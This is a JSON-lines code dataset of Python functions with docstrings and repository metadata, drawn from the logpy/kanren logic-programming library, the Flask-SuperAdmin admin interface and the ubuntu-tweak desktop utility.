{"docstring": "\"\"\" x > y \"\"\"\n", "func_signal": "def lt(x, y):\n", "code": "if not isvar(x) and not isvar(y):\n    return eq(x < y, True)\nelse:\n    raise EarlyGoalError()", "path": "kanren\\arith.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" x > y \"\"\"\n", "func_signal": "def gt(x, y):\n", "code": "if not isvar(x) and not isvar(y):\n    return eq(x > y, True)\nelse:\n    raise EarlyGoalError()", "path": "kanren\\arith.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Groups of length len that add up to total\n\n>>> from kanren.util import groupsizes\n>>> tuple(groupsizes(4, 2))\n((1, 3), (2, 2), (3, 1))\n\"\"\"\n", "func_signal": "def groupsizes(total, len):\n", "code": "if len == 1:\n    yield (total, )\nelse:\n    for i in range(1, total - len + 1 + 1):\n        for perm in groupsizes(total - i, len - 1):\n            yield (i, ) + perm", "path": "kanren\\util.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Evaluate tuple if unevaluated\n\n>>> from kanren.util import evalt\n>>> add = lambda x, y: x + y\n>>> evalt((add, 2, 3))\n5\n>>> evalt(add(2, 3))\n5\n\"\"\"\n\n", "func_signal": "def evalt(t):\n", "code": "if isinstance(t, tuple) and len(t) >= 1 and callable(t[0]):\n    return t[0](*t[1:])\nelse:\n    return t", "path": "kanren\\util.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Returns an evaluated (callable) goal, which returns a list of\nsubstitutions which match args against a fact in the knowledge base.\n\n*args: the goal to evaluate. This consists of vars and values to\n       match facts against.\n\n>>> from kanren.facts import Relation\n>>> from unification import var\n>>>\n>>> x, y = var('x'), var('y')\n>>> r = Relation()\n>>> r.add_fact(1, 2, 3)\n>>> r.add_fact(4, 5, 6)\n>>> list(r(x, y, 3)({})) == [{y: 2, x: 1}]\nTrue\n>>> list(r(x, 5, y)({})) == [{y: 6, x: 4}]\nTrue\n>>> list(r(x, 42, y)({}))\n[]\n\"\"\"\n\n", "func_signal": "def __call__(self, *args):\n", "code": "def goal(substitution):\n    args2 = reify(args, substitution)\n    subsets = [self.index[key] for key in enumerate(args)\n               if key in self.index]\n    if subsets:  # we are able to reduce the pool early\n        facts = intersection(*sorted(subsets, key=len))\n    else:\n        facts = self.facts\n\n    for fact in facts:\n        unified = unify(fact, args2, substitution)\n        if unified != False:\n            yield merge(unified, substitution)\n\nreturn goal", "path": "kanren\\facts.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Pretty print a tree of goals \"\"\"\n", "func_signal": "def pprint(g):\n", "code": "if callable(g) and hasattr(g, '__name__'):\n    return g.__name__\nif isinstance(g, type):  # pragma: no cover\n    return g.__name__\nif isinstance(g, tuple):\n    return \"(\" + ', '.join(map(pprint, g)) + \")\"\nreturn str(g)", "path": "kanren\\util.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\"\nRepeatedly calls f until a fixed point is reached.\n\nThis may not terminate, but should if you apply some eventually-idempotent\nsimplification operation like evalt.\n\"\"\"\n", "func_signal": "def find_fixed_point(f, arg):\n", "code": "last, cur = object(), arg\nwhile last != cur:\n    last = cur\n    cur = f(cur)\nreturn cur", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Declare several facts\n\n>>> from kanren import fact, Relation, var, run\n>>> parent = Relation()\n>>> facts(parent,  (\"Homer\", \"Bart\"),\n...                (\"Homer\", \"Lisa\"))\n\n>>> x = var()\n>>> run(1, x, parent(x, \"Bart\"))\n('Homer',)\n\"\"\"\n", "func_signal": "def facts(rel, *lists):\n", "code": "for l in lists:\n    fact(rel, *l)", "path": "kanren\\facts.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Reorder goals to avoid EarlyGoalErrors\n\nAll goals are evaluated.  Those that raise EarlyGoalErrors are placed at\nthe end in a lall\n\nSee also:\n    EarlyGoalError\n\"\"\"\n", "func_signal": "def earlyorder(*goals):\n", "code": "if not goals:\n    return ()\ngroups = groupby(earlysafe, goals)\ngood = groups.get(True, [])\nbad = groups.get(False, [])\n\nif not good:\n    raise EarlyGoalError()\nelif not bad:\n    return tuple(good)\nelse:\n    return tuple(good) + ((lall, ) + tuple(bad), )", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Logical any\n\n>>> from kanren import lany, membero\n>>> x = var('x')\n>>> g = lany(membero(x, (1,2,3)), membero(x, (2,3,4)))\n>>> tuple(g({}))\n({~x: 1}, {~x: 2}, {~x: 3}, {~x: 4})\n\"\"\"\n", "func_signal": "def lany(*goals):\n", "code": "if len(goals) == 1:\n    return goals[0]\nreturn lanyseq(goals)", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Logical any with possibly infinite number of goals\n\"\"\"\n\n", "func_signal": "def lanyseq(goals):\n", "code": "def anygoal(s):\n    anygoal.goals, local_goals = it.tee(anygoal.goals)\n\n    def f(goals):\n        for goal in goals:\n            try:\n                yield goaleval(reify(goal, s))(s)\n            except EarlyGoalError:\n                pass\n\n    return unique(\n        interleave(\n            f(local_goals),\n            pass_exceptions=[EarlyGoalError]),\n        key=dicthash)\n\nanygoal.goals = goals\n\nreturn anygoal", "path": "kanren\\core.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Add a fact to the knowledgebase.\n\nSee Also:\n    fact\n    facts\n\"\"\"\n", "func_signal": "def add_fact(self, *inputs):\n", "code": "fact = tuple(inputs)\n\nself.facts.add(fact)\n\nfor key in enumerate(inputs):\n    if key not in self.index:\n        self.index[key] = set()\n    self.index[key].add(fact)", "path": "kanren\\facts.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\" Transform binary operator into goal\n\n>>> from kanren.arith import binop\n>>> import operator\n>>> add = binop(operator.add, operator.sub)\n\n>>> from kanren import var, run\n>>> x = var('x')\n>>> next(add(1, 2, x)({}))\n{~x: 3}\n\"\"\"\n\n", "func_signal": "def binop(op, revop=None):\n", "code": "def goal(x, y, z):\n    if not isvar(x) and not isvar(y):\n        return eq(op(x, y), z)\n    if not isvar(y) and not isvar(z) and revop:\n        return eq(x, revop(z, y))\n    if not isvar(x) and not isvar(z) and revop:\n        return eq(y, revop(z, x))\n    raise EarlyGoalError()\n\ngoal.__name__ = op.__name__\nreturn goal", "path": "kanren\\arith.py", "repo_name": "logpy/logpy", "stars": 871, "license": "other", "language": "python", "size": 395}
{"docstring": "\"\"\"\n    Index view method\n\n    `path`\n        Optional directory path. If not provided,\n        will use base directory\n\"\"\"\n# Get path and verify if it is valid\n", "func_signal": "def index(self, path=None):\n", "code": "base_path, directory, path = self._normalize_path(path)\n\n# Get directory listing\nitems = []\n\n# Parent directory\nif directory != base_path:\n    parent_path = op.normpath(op.join(path, '..'))\n    if parent_path == '.':\n        parent_path = None\n\n    items.append(('..', parent_path, True, 0))\n\nfor f in os.listdir(directory):\n    fp = op.join(directory, f)\n\n    items.append((f, op.join(path, f), op.isdir(fp), op.getsize(fp)))\n\n# Sort by type\nitems.sort(key=itemgetter(2), reverse=True)\n\n# Generate breadcrumbs\naccumulator = []\nbreadcrumbs = []\nfor n in path.split(os.sep):\n    accumulator.append(n)\n    breadcrumbs.append((n, op.join(*accumulator)))\n\nreturn self.render(self.list_template,\n                   dir_path=path,\n                   breadcrumbs=breadcrumbs,\n                   get_dir_url=self._get_dir_url,\n                   get_file_url=self._get_file_url,\n                   items=items,\n                   base_path=base_path)", "path": "flask_superadmin\\contrib\\fileadmin.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Render template\n\n    `template`\n        Template path to render\n    `kwargs`\n        Template arguments\n\"\"\"\n# Store self as admin_view\n", "func_signal": "def render(self, template, **kwargs):\n", "code": "kwargs['admin_view'] = self\n\n# Provide i18n support even if flask-babel is not installed\n# or enabled.\nkwargs['_gettext'] = babel.gettext\nkwargs['_ngettext'] = babel.ngettext\n\nreturn render_template(template, **kwargs)", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Return static file url\n\n    `path`\n        Static file path\n\"\"\"\n", "func_signal": "def _get_file_url(self, path):\n", "code": "base_url = self.get_base_url()\nreturn urlparse.urljoin(base_url, path)", "path": "flask_superadmin\\contrib\\fileadmin.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Add view to the collection.\n\n    `view`\n        View to add.\n\"\"\"\n# Add to views\n", "func_signal": "def add_view(self, view):\n", "code": "self._views.append(view)\n\n# If app was provided in constructor, register view with Flask app\nif self.app is not None:\n    self.app.register_blueprint(view.create_blueprint(self))\n    self._add_view_to_menu(view)", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Use this decorator to expose views in your view classes.\n\n    `url`\n        Relative URL for the view\n    `methods`\n        Allowed HTTP methods. By default only GET is allowed.\n\"\"\"\n", "func_signal": "def expose(url='/', methods=('GET',)):\n", "code": "def wrap(f):\n    if not hasattr(f, '_urls'):\n        f._urls = []\n    f._urls.append((url, methods))\n    return f\n\nreturn wrap", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Add view to the menu tree\n\n    `view`\n        View to add\n\"\"\"\n", "func_signal": "def _add_view_to_menu(self, view):\n", "code": "if view.category:\n    category = self._menu_categories.get(view.category)\n\n    if category is None:\n        category = MenuItem(view.category)\n        self._menu_categories[view.category] = category\n        self._menu.append(category)\n\n    category.add_child(MenuItem(view.name, view))\nelse:\n    self._menu.append(MenuItem(view.name, view))", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Verify and normalize path.\n\n    If path is not relative to the base directory,\n    will throw 404 exception.\n\n    If path does not exist, will also throw 404 exception.\n\"\"\"\n", "func_signal": "def _normalize_path(self, path):\n", "code": "base_path = self.get_base_path()\n\nif path is None:\n    directory = base_path\n    path = ''\nelse:\n    path = op.normpath(path)\n    directory = op.normpath(op.join(base_path, path))\n\n    if not self.is_in_folder(base_path, directory):\n        abort(404)\n\nif not op.exists(directory):\n    abort(404)\n\nreturn base_path, directory, path", "path": "flask_superadmin\\contrib\\fileadmin.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Installs locale selector for current ``Admin`` instance.\n\n    Example::\n\n        def admin_locale_selector():\n            return request.args.get('lang', 'en')\n\n        admin = Admin(app)\n        admin.locale_selector(admin_locale_selector)\n\n    It is also possible to use the ``@admin`` decorator::\n\n        admin = Admin(app)\n\n        @admin.locale_selector\n        def admin_locale_selector():\n            return request.args.get('lang', 'en')\n\n    Or by subclassing the ``Admin``::\n\n        class MyAdmin(Admin):\n            def locale_selector(self):\n                return request.args.get('lang', 'en')\n\"\"\"\n", "func_signal": "def locale_selector(self, f):\n", "code": "if self.locale_selector_func is not None:\n    raise Exception('Can not add locale_selector second time.')\n\nself.locale_selector_func = f", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Return property iterator for the model\n\"\"\"\n", "func_signal": "def _get_model_iterator(self, model=None):\n", "code": "if model is None:\n    model = self.model\n\nreturn model._sa_class_manager.mapper.iterate_properties", "path": "flask_superadmin\\model\\backends\\sqlalchemy\\view.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\" A convenient decorator for the ModelConverter used to mark which\nmethod should be used to convert which MongoEngine field.\n\"\"\"\n", "func_signal": "def converts(*args):\n", "code": "def _inner(func):\n    func._converter_for = frozenset(args)\n    return func\nreturn _inner", "path": "flask_superadmin\\model\\backends\\mongoengine\\orm.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Register all views with Flask application.\n\n    `app`\n        Flask application instance\n\"\"\"\n", "func_signal": "def init_app(self, app):\n", "code": "self.app = app\n\napp.extensions = getattr(app, 'extensions', {})\napp.extensions['admin'] = self\n\nfor view in self._views:\n    app.register_blueprint(view.create_blueprint(self))\n    self._add_view_to_menu(view)", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\" Create Flask blueprint. \"\"\"\n\n# Store admin instance\n", "func_signal": "def create_blueprint(self, admin):\n", "code": "self.admin = admin\n\n# If endpoint name is not provided, get it from the class name\nif self.endpoint is None:\n    self.endpoint = self.__class__.__name__.lower()\n\n# If url is not provided, generate it from endpoint name\nif self.url is None:\n    self.url = '%s/%s' % (self.admin.url, self.endpoint)\nelse:\n    if not self.url.startswith('/'):\n        self.url = '%s/%s' % (self.admin.url, self.url)\n\n# If name is not povided, use capitalized endpoint name\nif self.name is None:\n    self.name = self._prettify_name(self.__class__.__name__)\n\n# Create blueprint and register rules\nself.blueprint = Blueprint(self.endpoint, __name__,\n                           url_prefix=self.url,\n                           template_folder='templates',\n                           static_folder=self.static_folder)\n\nfor url, name, methods in self._urls:\n    self.blueprint.add_url_rule(url,\n                                name,\n                                getattr(self, name),\n                                methods=methods)\n\nreturn self.blueprint", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Verify if file can be uploaded.\n\n    Override to customize behavior.\n\n    `filename`\n        Source file name\n\"\"\"\n", "func_signal": "def is_file_allowed(self, filename):\n", "code": "ext = op.splitext(filename)[1].lower()\n\nif ext.startswith('.'):\n    ext = ext[1:]\n\nif self.allowed_extensions and ext not in self.allowed_extensions:\n    return False\n\nreturn True", "path": "flask_superadmin\\contrib\\fileadmin.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Return True if form contains at least one FileField.\n\"\"\"\n# TODO: Optimize me\n", "func_signal": "def has_file_field(self):\n", "code": "for f in self:\n    if isinstance(f, fields.FileField):\n        return True\n\nreturn False", "path": "flask_superadmin\\form.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "#TODO: may be set file field that will save file`s data to MongoDB\n", "func_signal": "def conv_Binary(self, model, field, kwargs):\n", "code": "if field.max_bytes:\n    kwargs['validators'].append(validators.Length(max=field.max_bytes))\nreturn f.TextAreaField(**kwargs)", "path": "flask_superadmin\\model\\backends\\mongoengine\\orm.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Return prettified URL\n\n    `endpoint`\n        Endpoint name\n    `path`\n        Directory path\n    `kwargs`\n        Additional arguments\n\"\"\"\n", "func_signal": "def _get_dir_url(self, endpoint, path, **kwargs):\n", "code": "if not path:\n    return url_for(endpoint)\nelse:\n    if self._on_windows:\n        path = path.replace('\\\\', '/')\n\n    kwargs['path'] = path\n\n    return url_for(endpoint, **kwargs)", "path": "flask_superadmin\\contrib\\fileadmin.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Constructor.\n\n    `name`\n        Name of this view. If not provided, will be defaulted to the class name.\n    `category`\n        View category. If not provided, will be shown as a top-level menu item. Otherwise, will\n        be in a submenu.\n    `endpoint`\n        Base endpoint name for the view. For example, if there's view method called \"index\" and\n        endpoint was set to \"myadmin\", you can use `url_for('myadmin.index')` to get URL to the\n        view method. By default, equals to the class name in lower case.\n    `url`\n        Base URL. If provided, affects how URLs are generated. For example, if url parameter\n        equals to \"test\", resulting URL will look like \"/admin/test/\". If not provided, will\n        use endpoint as a base url. However, if URL starts with '/', absolute path is assumed\n        and '/admin/' prefix won't be applied.\n\"\"\"\n", "func_signal": "def __init__(self, name=None, category=None, endpoint=None, url=None, static_folder=None):\n", "code": "self.name = name\nself.category = category\nself.endpoint = endpoint\nself.url = url\nself.static_folder = static_folder\n\n# Initialized from create_blueprint\nself.admin = None\nself.blueprint = None\n\n# Default view\nif self._default_view is None:\n    raise Exception('Attempted to instantiate admin view %s without default view' % self.__class__.__name__)", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "# TODO: WTF\n", "func_signal": "def get_pk_from_identity(obj):\n", "code": "cls, key = identity_key(instance=obj)\nreturn ':'.join(str(x) for x in key)", "path": "flask_superadmin\\model\\backends\\mongoengine\\fields.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Constructor\n\n    `label`\n        Label\n    `validators`\n        Field validators\n    `formats`\n        Supported time formats, as a enumerable.\n    `kwargs`\n        Any additional parameters\n\"\"\"\n", "func_signal": "def __init__(self, label=None, validators=None, formats=None, **kwargs):\n", "code": "super(TimeField, self).__init__(label, validators, **kwargs)\n\nself.formats = formats or ('%H:%M:%S', '%H:%M',\n                          '%I:%M:%S%p', '%I:%M%p',\n                          '%I:%M:%S %p', '%I:%M %p')", "path": "flask_superadmin\\form.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "\"\"\"\n    Register model to the collection.\n\n    `model`\n        Model to add.\n    `admin_class`\n        ModelAdmin class corresponding to model.\n\"\"\"\n", "func_signal": "def register(self, model, admin_class=None, *args, **kwargs):\n", "code": "from flask_superadmin.model import ModelAdmin\n\nadmin_class = admin_class or ModelAdmin\n\nbackend = self.model_backend(model)\nnew_class = type(admin_class.__name__, (admin_class, backend), {})\nmodel_view = new_class(model, *args, **kwargs)\n\nself._models.append((model, model_view))\nself.add_view(model_view)", "path": "flask_superadmin\\base.py", "repo_name": "syrusakbary/Flask-SuperAdmin", "stars": 634, "license": "other", "language": "python", "size": 2063}
{"docstring": "# This function is taken from gnome-tweak-tool\n", "func_signal": "def walk_directories(dirs, filter_func):\n", "code": "valid = []\ntry:\n    for thdir in dirs:\n        if os.path.isdir(thdir):\n            for t in os.listdir(thdir):\n                if filter_func(os.path.join(thdir, t)):\n                     valid.append(t)\nexcept:\n    log.critical(\"Error parsing directories\", exc_info=True)\n\nvalid.sort()\n\nreturn valid", "path": "ubuntutweak\\utils\\__init__.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "'''if init is true, force to update, or it will update only once'''\n", "func_signal": "def update_apt_cache(self, init=False):\n", "code": "if init or not getattr(self, 'cache'):\n    apt_pkg.init()\n    self.cache = apt.Cache()", "path": "ubuntutweak\\backends\\daemon.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "'''The model is icon, title and the list reference'''\n", "func_signal": "def _create_model(self):\n", "code": "model = Gtk.ListStore(GdkPixbuf.Pixbuf,\n                      GObject.TYPE_STRING,\n                      GObject.TYPE_STRING)\n\nreturn model", "path": "ubuntutweak\\admins\\filetypemanager.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "# Normal case\n", "func_signal": "def test_widget_factory(self):\n", "code": "user_indicator_label, user_menu_switch, reset_button = WidgetFactory.create(\"Switch\",\n                          label='user-indicator',\n                          enable_reset=True,\n                          backend=\"gsettings\",\n                          key='com.canonical.indicator.session.user-show-menu')\n\nself.assertTrue(isinstance(user_indicator_label, Gtk.Label))\nself.assertTrue(isinstance(user_menu_switch, Gtk.Switch))\nself.assertTrue(isinstance(reset_button, Gtk.Button))\n\n# No reset case\nuser_indicator_label, user_menu_switch = WidgetFactory.create(\"Switch\",\n                          label='user-indicator',\n                          backend=\"gsettings\",\n                          key='com.canonical.indicator.session.user-show-menu')\nself.assertTrue(isinstance(user_indicator_label, Gtk.Label))\nself.assertTrue(isinstance(user_menu_switch, Gtk.Switch))\n\n# Failed case, no reset\nuser_indicator_label, user_menu_switch = WidgetFactory.create(\"Switch\",\n                          label='user-indicator',\n                          backend=\"gsettings\",\n                          key='org.canonical.indicator.session.user-show-menu')\nself.assertFalse(user_indicator_label)\nself.assertFalse(user_menu_switch)\n\n# Failed case, reset\nuser_indicator_label, user_menu_switch, reset_button = WidgetFactory.create(\"Switch\",\n                          label='user-indicator',\n                          enable_reset=True,\n                          backend=\"gsettings\",\n                          key='org.canonical.indicator.session.user-show-menu')\n\nself.assertFalse(user_indicator_label)\nself.assertFalse(user_menu_switch)\nself.assertFalse(reset_button)", "path": "tests\\test_factory.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "#print \"request to remove \" + key\n", "func_signal": "def rm(self, key):\n", "code": "cmd = self.rm_opt[:]\ncmd.append(key)\np = subprocess.Popen(cmd)\nreturn (p.wait() == 0)", "path": "ubuntutweak\\backends\\daemon.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "\"\"\"\nReturn the number of hours since the last successful apt-get update\n      \nIf the date is unknown, return \"None\"\n\"\"\"\n", "func_signal": "def _get_last_apt_get_update_hours(self):\n", "code": "if not os.path.exists(\"/var/lib/apt/periodic/update-success-stamp\"):\n    return None\n# calculate when the last apt-get update (or similar operation)\n# was performed\nmtime = os.stat(\"/var/lib/apt/periodic/update-success-stamp\")[stat.ST_MTIME]\nago_hours = int((time.time() - mtime) / (60*60) )\nreturn ago_hours", "path": "ubuntutweak\\clips\\updateinfo.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "# This function is taken from gnome-tweak-tool\n", "func_signal": "def _get_valid_icon_themes(self):\n", "code": "dirs = ( '/usr/share/icons',\n         os.path.join(os.path.expanduser(\"~\"), \".icons\"))\nvalid = walk_directories(dirs, lambda d:\n            os.path.isdir(d) and \\\n                not os.path.exists(os.path.join(d, \"cursors\")))\n\nvalid.sort()\n\nreturn valid", "path": "ubuntutweak\\tweaks\\theme.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "'''This is called by tweaks/loginsettings.py'''\n", "func_signal": "def unset_login_logo(self, dest, sender=None):\n", "code": "self._check_permission(sender, PK_ACTION_TWEAK)\n\nif dest.startswith(os.path.expanduser('~gdm/.icons')):\n    self._delete_old_logofile(dest)", "path": "ubuntutweak\\backends\\daemon.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "#TODO need to test dir with os.R_OK | os.W_OK | os.X_OK\n", "func_signal": "def config_test(self):\n", "code": "if not os.path.exists(SYSTEM_DIR):\n    self.default.create()", "path": "ubuntutweak\\admins\\templates.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "\"\"\"\nFormats the value like a 'human-readable' file size (i.e. 13 KB, 4.1 MB,\n102 bytes, etc).\n\"\"\"\n", "func_signal": "def filesizeformat(bytes):\n", "code": "try:\n    bytes = float(bytes)\nexcept TypeError:\n    return \"0 bytes\"\n\nif bytes < 1024:\n    return ngettext(\"%(size)d byte\", \"%(size)d bytes\", bytes) % {'size': bytes}\nif bytes < 1024 * 1024:\n    return _(\"%.1f KB\") % (bytes / 1024)\nif bytes < 1024 * 1024 * 1024:\n    return _(\"%.1f MB\") % (bytes / (1024 * 1024))\nreturn _(\"%.1f GB\") % (bytes / (1024 * 1024 * 1024))", "path": "ubuntutweak\\utils\\__init__.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "\"\"\"\nreturn a human readable string with the information when\nthe last apt-get update was run\n\"\"\"\n", "func_signal": "def _get_last_apt_get_update_text(self):\n", "code": "ago_hours = self._get_last_apt_get_update_hours()\nif ago_hours is None:\n    return _(\"It is unknown when the package information was \"\n             \"updated last. Please try clicking on the 'Check' \"\n             \"button to update the information.\")\nago_days = int( ago_hours / 24 )\nif ago_days > self.NO_UPDATE_WARNING_DAYS:\n    return _(\"The package information was last updated %(days_ago)s \"\n             \"days ago.\\n\"\n             \"Press the 'Check' button below to check for new software \"\n             \"updates.\") % { \"days_ago\" : ago_days, }\nelif ago_days > 0:\n    return ngettext(\"The package information was last updated %(days_ago)s day ago.\",\n                    \"The package information was last updated %(days_ago)s days ago.\",\n                    ago_days) % { \"days_ago\" : ago_days, }\nelif ago_hours > 0:\n    return ngettext(\"The package information was last updated %(hours_ago)s hour ago.\",\n                    \"The package information was last updated %(hours_ago)s hours ago.\",\n                    ago_hours) % { \"hours_ago\" : ago_hours, }\nelse:\n    return _(\"The package information was last updated less than one hour ago.\")\nreturn None", "path": "ubuntutweak\\clips\\updateinfo.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "'''This is called by tweaks/loginsettings.py'''\n", "func_signal": "def set_login_logo(self, src, dest, sender=None):\n", "code": "self._check_permission(sender, PK_ACTION_TWEAK)\nif not self.is_exists(os.path.dirname(dest)):\n   os.makedirs(os.path.dirname(dest))\nself._delete_old_logofile(dest)\nshutil.copy(src, dest)", "path": "ubuntutweak\\backends\\daemon.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "'''if init is true, force to update, or it will update only once'''\n", "func_signal": "def update_apt_cache(self, init=False):\n", "code": "if init or not getattr(self, 'cache'):\n    apt_pkg.init()\n    self.cache = apt.Cache()", "path": "ubuntutweak\\utils\\package.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "'''The model is icon, title and the list reference'''\n", "func_signal": "def _create_model(self):\n", "code": "model = Gtk.ListStore(GObject.TYPE_STRING,\n                      GdkPixbuf.Pixbuf,\n                      GObject.TYPE_STRING,\n                      GdkPixbuf.Pixbuf,\n                      GObject.TYPE_STRING)\n\nreturn model", "path": "ubuntutweak\\admins\\filetypemanager.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "#print \"request to add \" + filename\n", "func_signal": "def add(self, filename):\n", "code": "cmd = self.add_opt[:]\ncmd.append(filename)\np = subprocess.Popen(cmd)\nreturn (p.wait() == 0)", "path": "ubuntutweak\\backends\\daemon.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "#FIXME\n", "func_signal": "def install_ngettext():\n", "code": "gettext.bindtextdomain(PACKAGE, \"/usr/share/locale\")\ngettext.textdomain(PACKAGE)", "path": "ubuntutweak\\common\\consts.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "#TODO leave only one method\n", "func_signal": "def add_apt_key_from_content(self, content, sender=None):\n", "code": "self._check_permission(sender, PK_ACTION_SOURCE)\n\nf = tempfile.NamedTemporaryFile()\nf.write(content)\nf.flush()\n\napt_key = AptAuth()\napt_key.add(f.name)\nf.close()", "path": "ubuntutweak\\backends\\daemon.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
{"docstring": "# for performance reasons\n", "func_signal": "def parse(self, filename):\n", "code": "content = self.content\n\nif not os.path.isfile(filename):\n    return\n\n# parse file\ntry:\n    file(filename, 'r')\nexcept IOError:\n    return\n\nfor line in file(filename,'r'):\n    line = line.strip()\n    # empty line\n    if not line:\n        continue\n    # comment\n    elif line[0] == '#':\n        continue\n    # key\n    else:\n        index = line.find(\"=\")\n        key = line[0:index].strip()\n        value = line[index+1:].strip()\n        if self.hasKey(key):\n            continue\n        else:\n            content[key] = value\n\nself.filename = filename", "path": "ubuntutweak\\common\\inifile.py", "repo_name": "tualatrix/ubuntu-tweak", "stars": 694, "license": "gpl-2.0", "language": "python", "size": 26097}
